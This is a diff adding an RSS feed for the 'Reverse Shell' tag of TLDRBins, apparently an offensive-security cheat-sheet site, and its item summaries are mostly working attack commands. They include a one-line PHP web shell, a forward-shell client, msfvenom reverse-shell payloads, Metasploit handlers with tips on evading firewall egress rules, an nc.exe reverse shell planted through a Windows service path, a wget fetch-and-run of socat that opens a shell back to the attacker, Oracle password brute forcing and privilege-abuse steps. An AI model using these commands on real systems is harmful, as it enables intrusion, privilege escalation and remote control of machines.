@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Reverse Shell on TLDRBins</title>
+    <link>https://tldrbins.github.io/@reverse-shell/</link>
+    <description>Recent content in Reverse Shell on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@reverse-shell/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Forward Shell</title>
+      <link>https://tldrbins.github.io/forward_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/forward_shell/</guid>
+      <description>Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = &amp;#34;shell&amp;gt; &amp;#34; def default(self, args): response = requests.get(&amp;#34;http://example.com/cmd.php&amp;#34;, params = {&amp;#34;cmd&amp;#34;: args}, proxies={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}) print(response.text) term = Term() term.cmdloop() </description>
+    </item>
+    <item>
+      <title>Listeners</title>
+      <link>https://tldrbins.github.io/listeners/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/listeners/</guid>
+      <description>Listener Tools nc ncat pwncat rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp &amp;lt;LOCAL_PORT&amp;gt; pwncat-cs -lp &amp;lt;LOCAL_PORT&amp;gt; # After getting a connection back Ref: pwncat</description>
+    </item>
+    <item>
+      <title>Metasploit Listener</title>
+      <link>https://tldrbins.github.io/metasploit_listener/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_listener/</guid>
+      <description>Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules&#xA;If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; set AutoRunScript multi_console_command -r automigrate.</description>
+    </item>
+    <item>
+      <title>Metasploit Shellcode</title>
+      <link>https://tldrbins.github.io/metasploit_shellcode/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
+      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.dll Windows x86 Staged exe Stageless exe msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
+    </item>
+    <item>
+      <title>Oracle Database</title>
+      <link>https://tldrbins.github.io/oracle/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/oracle/</guid>
+      <description>Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT&#xA;Enum # SID enum (You only need one) odat sidguesser -s &amp;lt;TARGET&amp;gt; # User/Password brute force odat passwordguesser -s &amp;lt;TARGET&amp;gt; -d &amp;lt;SID&amp;gt; --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s &amp;lt;TARGET&amp;gt; -U &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -P &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;SID&amp;gt; --sysdba General # Export everytime or add to ~/.</description>
+    </item>
+    <item>
+      <title>PHP Command Shell</title>
+      <link>https://tldrbins.github.io/php_cmd_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/php_cmd_shell/</guid>
+      <description>PHP Command Shell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; </description>
+    </item>
+    <item>
+      <title>SeDebugPrivilege</title>
+      <link>https://tldrbins.github.io/sedebugprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sedebugprivilege/</guid>
+      <description>Tools Metasploit psgetsys.ps1 # Inside meterpreter ps winlogon # Explorer.exe is a good candidate migrate &amp;lt;PID&amp;gt; # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34; Ref: psgetsys</description>
+    </item>
+    <item>
+      <title>SeLoadDriverPrivilege</title>
+      <link>https://tldrbins.github.io/seloaddriverprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/seloaddriverprivilege/</guid>
+      <description>Abuse #1: Install malicious driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
+    </item>
+    <item>
+      <title>Server Operators</title>
+      <link>https://tldrbins.github.io/server_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/server_operators/</guid>
+      <description>Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; # Start service sc.exe stop &amp;lt;SERVICE&amp;gt; Additional: Create service # Create a service sc.exe create &amp;lt;NEW_SERVICE&amp;gt; binpath= C:\ProgramData\rev.exe start= auto Note: there is a space after named arguments</description>
+    </item>
+    <item>
+      <title>Upgrade Shell</title>
+      <link>https://tldrbins.github.io/upgrade_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/upgrade_shell/</guid>
+      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:&amp;lt;LOCAL_PORT&amp;gt; # In target machine wget -q http://&amp;lt;LOCAL_IP&amp;gt;/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; # In our local Linux machine export TERM=xterm-256color Ref: Download socat</description>
+    </item>
+  </channel>
+</rss>
